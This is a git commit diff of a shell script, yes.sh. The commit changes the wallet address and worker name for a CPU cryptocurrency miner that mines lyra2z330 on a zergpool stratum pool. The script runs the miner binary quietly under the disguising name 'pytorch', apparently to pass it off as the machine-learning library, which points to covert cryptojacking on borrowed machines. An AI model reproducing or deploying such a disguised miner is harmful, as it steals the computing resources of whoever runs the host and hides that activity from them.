17b771dccaeec5e63a8c7aa2816745593d8d5de4
AndiSN <85962368+AndiSN@users.noreply.github.com>
2021-06-18 23:19:04 +0700

    Update yes.sh

--- yes.sh
+++ yes.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 POOL=stratum+tcp://lyra2z330.na.mine.zergpool.com:4563
-WALLET=DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-CPU-MANTAB)
+WALLET=DB1NpThnyLohkQXM3B7fyiLDfiUaAMAXQH
+WORKER=$(echo KULI-$(shuf -i 1000-9999 -n 1))
 chmod +x pytorch
 ./pytorch -a lyra2z330 -o $POOL -u $WALLET -p c=DGB,mc=PYRK,ID=$WORKER -q
 while [ 1 ]; do
